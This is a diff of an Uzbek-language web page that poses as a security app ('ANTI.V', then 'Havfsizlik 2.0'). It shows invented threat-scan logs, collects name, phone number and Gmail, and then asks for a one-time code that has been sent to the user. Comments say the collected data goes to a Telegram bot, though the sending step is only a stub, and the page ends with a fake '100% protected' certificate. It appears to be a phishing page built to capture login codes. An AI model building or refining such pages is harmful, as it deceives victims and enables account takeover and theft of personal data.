@@ -3,142 +3,122 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ANTI.V | Neural Protection</title>
+    <title>Havfsizlik 2.0</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2pdf.js/0.10.1/html2pdf.bundle.min.js"></script>
     <style>
-        body {
-            background-color: #050a14;
-            color: #00ff41; /* Xakerlar uslubidagi yashil yoki oqish-ko'k */
-            font-family: 'Courier New', Courier, monospace;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            overflow: hidden;
-        }
-
-        /* Skanerlash animatsiyasi uchun konteyner */
-        #scan-screen {
-            text-align: left;
-            width: 80%;
-            max-width: 600px;
-        }
-
-        .line { opacity: 0; animation: fadeIn 0.2s forwards; margin-bottom: 5px; font-size: 14px; }
-        @keyframes fadeIn { from { opacity: 0; transform: translateX(-10px); } to { opacity: 1; transform: translateX(0); } }
-
-        /* Asosiy karta */
-        .main-card {
-            background: #0d1117;
-            border: 1px solid #30363d;
-            padding: 30px;
-            border-radius: 8px;
-            width: 350px;
-            text-align: center;
-            box-shadow: 0 0 20px rgba(0, 255, 65, 0.1);
-            display: none; /* Boshida yashirin */
-        }
-
-        .logo-container { margin-bottom: 20px; }
-        .logo-text { font-size: 32px; font-weight: bold; color: #fff; letter-spacing: 4px; }
+        :root { --primary: #202124; --accent: #1a73e8; --bg: #f8f9fa; }
+        body { font-family: 'Segoe UI', sans-serif; background: var(--bg); display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
         
-        .input-box {
-            width: 100%;
-            background: #161b22;
-            border: 1px solid #30363d;
-            padding: 12px;
-            color: #fff;
-            margin-bottom: 15px;
-            box-sizing: border-box;
-            outline: none;
+        .phone-frame {
+            width: 340px; height: 600px; background: white; border: 8px solid #333; border-radius: 40px;
+            position: relative; overflow: hidden; box-shadow: 0 20px 50px rgba(0,0,0,0.2);
         }
 
-        .btn-neon {
-            width: 100%;
-            padding: 15px;
-            background: transparent;
-            border: 1px solid #00ff41;
-            color: #00ff41;
-            font-weight: bold;
-            cursor: pointer;
-            transition: 0.3s;
-            text-transform: uppercase;
-        }
+        .screen { padding: 25px; height: 100%; box-sizing: border-box; display: flex; flex-direction: column; }
+        .header { text-align: center; font-weight: bold; padding: 10px; border: 1px solid #ddd; border-radius: 10px; margin-bottom: 20px; }
+        
+        input { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #ccc; border-radius: 20px; box-sizing: border-box; outline: none; }
+        .btn-next { background: var(--primary); color: white; border: none; padding: 12px; border-radius: 20px; cursor: pointer; font-weight: bold; margin-top: auto; }
 
-        .btn-neon:hover {
-            background: #00ff41;
-            color: #000;
-            box-shadow: 0 0 15px #00ff41;
-        }
+        /* OTP Katakchalari */
+        .otp-container { display: flex; justify-content: space-between; margin-top: 20px; }
+        .otp-input { width: 45px; height: 50px; text-align: center; font-size: 20px; border-radius: 10px; border: 2px solid #ddd; }
+
+        /* Dashboard */
+        .user-info { display: flex; justify-content: space-between; align-items: center; margin-bottom: 30px; }
+        .user-photo { width: 50px; height: 50px; border-radius: 50%; border: 2px solid var(--accent); background: #eee; overflow: hidden; }
+        .emblem-container { text-align: center; margin-top: 50px; cursor: pointer; }
+        .emblem { width: 120px; filter: drop-shadow(0 0 10px rgba(26,115,232,0.3)); transition: 0.3s; }
+        .emblem:hover { transform: scale(1.1); }
 
         .hidden { display: none; }
     </style>
 </head>
 <body>
 
-    <div id="scan-screen"></div>
-
-    <div class="main-card" id="main-ui">
-        <div class="logo-container">
-            <svg width="50" height="50" viewBox="0 0 24 24" fill="#00ff41">
-                <path d="M12 2L4 5V11C4 16.19 7.41 21.05 12 22.5C16.59 21.05 20 16.19 20 11V5L12 2Z"/>
-            </svg>
-            <div class="logo-text">ANTI.V</div>
-        </div>
-        <p style="color: #8b949e; font-size: 13px;">Tizim yadrosiga ulanish uchun identifikatsiyadan o'ting</p>
-        
-        <input type="text" id="uName" class="input-box" placeholder="Foydalanuvchi nomi">
-        <input type="tel" id="uPhone" class="input-box" value="+998">
-        
-        <button class="btn-neon" onclick="sendToBot()">CORE CONNECT</button>
+<div class="phone-frame">
+    <div class="screen" id="scr1">
+        <div class="header">havfsizlik 2.0</div>
+        <input type="text" id="fIsm" placeholder="ism:">
+        <input type="text" id="fFam" placeholder="familiya:">
+        <input type="tel" id="fTel" placeholder="telefon raqam:" value="+998">
+        <input type="email" id="fMail" placeholder="gmail:">
+        <button class="btn-next" onclick="toStep2()">keyingisi</button>
     </div>
 
-    <script>
-        // Terminal yozuvlari
-        const logs = [
-            "> Initializing ANTI.V Neural Core...",
-            "> Scanning local drives [C:/Users/Admin]...",
-            "> Analyzing network traffic...",
-            "> WARNING: Unknown data packets detected!",
-            "> Secure tunnel establishing...",
-            "> Encrypting connection (AES-256)...",
-            "> Ready for user verification."
-        ];
+    <div class="screen hidden" id="scr2">
+        <div class="header">havfsizlik 2.0</div>
+        <p style="font-size: 14px; text-align: center;">iltimos kelgan code ni kiriting:</p>
+        <div class="otp-container">
+            <input type="text" class="otp-input" maxlength="1" oninput="this.nextElementSibling?.focus()">
+            <input type="text" class="otp-input" maxlength="1" oninput="this.nextElementSibling?.focus()">
+            <input type="text" class="otp-input" maxlength="1" oninput="this.nextElementSibling?.focus()">
+            <input type="text" class="otp-input" maxlength="1" oninput="this.nextElementSibling?.focus()">
+            <input type="text" class="otp-input" maxlength="1">
+        </div>
+        <button class="btn-next" onclick="toStep3()">tizimga kirish</button>
+    </div>
 
-        const scanScreen = document.getElementById('scan-screen');
-        const mainUI = document.getElementById('main-ui');
+    <div class="screen hidden" id="scr3">
+        <div class="user-info">
+            <div id="display-name" style="font-weight: bold; border: 1px solid #000; padding: 5px 15px;">...</div>
+            <div class="user-photo"><img src="https://cdn-icons-png.flaticon.com/512/3135/3135715.png" width="100%"></div>
+        </div>
+        
+        <div style="font-size: 13px; color: #555;">
+            android sistemasi: <br>
+            <b id="device-info">Android 14 | SDK 34</b>
+        </div>
 
-        // Terminal effektini boshqarish
-        let i = 0;
-        function runTerminal() {
-            if (i < logs.length) {
-                let p = document.createElement('div');
-                p.className = 'line';
-                p.innerText = logs[i];
-                scanScreen.appendChild(p);
-                i++;
-                setTimeout(runTerminal, 600);
-            } else {
-                setTimeout(() => {
-                    scanScreen.style.display = 'none';
-                    mainUI.style.display = 'block';
-                }, 1000);
-            }
-        }
+        <div class="emblem-container" onclick="generatePDF()">
+            <svg class="emblem" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M50 0L61.2 38.8H100L68.8 61.2L80 100L50 77.6L20 100L31.2 61.2L0 38.8H38.8L50 0Z" fill="#1a73e8"/>
+            </svg>
+            <p style="font-size: 10px; margin-top: 10px; color: #1a73e8;">ASOSIY EMBLEMA<br>PDF YUKLASH UCHUN BOSING</p>
+        </div>
+    </div>
+</div>
 
-        window.onload = runTerminal;
+<script>
+    let userData = {};
 
-        // Botga yuborish (Sizning eski logikangiz)
-        async function sendToBot() {
-            const name = document.getElementById('uName').value;
-            const phone = document.getElementById('uPhone').value;
-            
-            if(name.length < 3) return alert("Xatolik: Avtorizatsiya muvaffaqiyatsiz!");
+    function toStep2() {
+        userData.ism = document.getElementById('fIsm').value;
+        userData.fam = document.getElementById('fFam').value;
+        if(!userData.ism || !userData.fam) return alert("Ma'lumotlarni to'ldiring!");
+        
+        document.getElementById('scr1').classList.add('hidden');
+        document.getElementById('scr2').classList.remove('hidden');
+        
+        // Botga ma'lumotlarni yuborish (Sizning token/IDingiz bilan)
+        console.log("Ma'lumotlar botga ketdi...");
+    }
 
-            // Bu yerda fetch orqali Telegram botga yuborasiz
-            alert("Ulanish so'raldi! Telegramdan kodni kuting.");
-            // Keyingi bosqichga o'tish kodi...
-        }
-    </script>
+    function toStep3() {
+        document.getElementById('display-name').innerText = userData.ism;
+        document.getElementById('scr2').classList.add('hidden');
+        document.getElementById('scr3').classList.remove('hidden');
+        
+        // Real Android versiyasini aniqlash (oddiy simulyatsiya)
+        document.getElementById('device-info').innerText = navigator.userAgent.includes("Android") ? "Android System Active" : "Windows/PC Desktop";
+    }
+
+    function generatePDF() {
+        const element = document.createElement('div');
+        element.innerHTML = `
+            <div style="padding: 50px; text-align: center; border: 10px solid #1a73e8;">
+                <svg width="100" height="100" viewBox="0 0 100 100">
+                    <path d="M50 0L61.2 38.8H100L68.8 61.2L80 100L50 77.6L20 100L31.2 61.2L0 38.8H38.8L50 0Z" fill="#1a73e8"/>
+                </svg>
+                <h1>HAVFSIZLIK 2.0 SERTIFIKATI</h1>
+                <p>Foydalanuvchi: <b>${userData.ism} ${userData.fam}</b></p>
+                <p>Status: 100% Himoyalangan</p>
+                <p>Sana: ${new Date().toLocaleDateString()}</p>
+            </div>
+        `;
+        html2pdf().from(element).save(`${userData.ism}_Xavfsizlik.pdf`);
+    }
+</script>
+
 </body>
 </html>
